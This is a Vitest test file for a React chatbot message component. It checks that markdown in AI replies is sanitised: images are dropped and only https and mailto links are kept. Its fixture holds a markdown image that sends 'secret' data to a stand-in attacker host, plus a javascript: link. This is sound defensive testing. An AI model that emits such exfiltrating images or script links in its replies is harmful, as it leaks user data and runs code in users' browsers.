import { screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { renderApp } from "../../test/render";
import ChatMessage from "./ChatMessage";
import { ChatBotMessageType } from "./types";

const REPLY = [
  "![tracking pixel](https://evil.example/pixel.png?d=secret)",
  "[js](javascript:alert(1)) [plain](http://insecure.example) [secure](https://grants.gov/x) [mail](mailto:help@example.org)",
].join("\n\n");

describe("ChatMessage markdown", () => {
  it("shows image alt text instead of loading images and keeps only https and mailto links", () => {
    const { container } = renderApp(
      <ChatMessage message={{ type: ChatBotMessageType.AI, content: REPLY, metadata: {} }} />
    );

    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByText("tracking pixel")).toBeInTheDocument();

    const links = [...container.querySelectorAll("a")];
    expect(links.map((a) => a.getAttribute("href"))).toEqual(["https://grants.gov/x", "mailto:help@example.org"]);
    for (const a of links) {
      expect(a).toHaveAttribute("target", "_blank");
      expect(a).toHaveAttribute("rel", "noopener noreferrer");
    }
    expect(container.textContent).toMatch(/js plain secure mail/);
    expect(container.innerHTML).not.toMatch(/javascript:|insecure\.example|evil\.example/);
  });
});
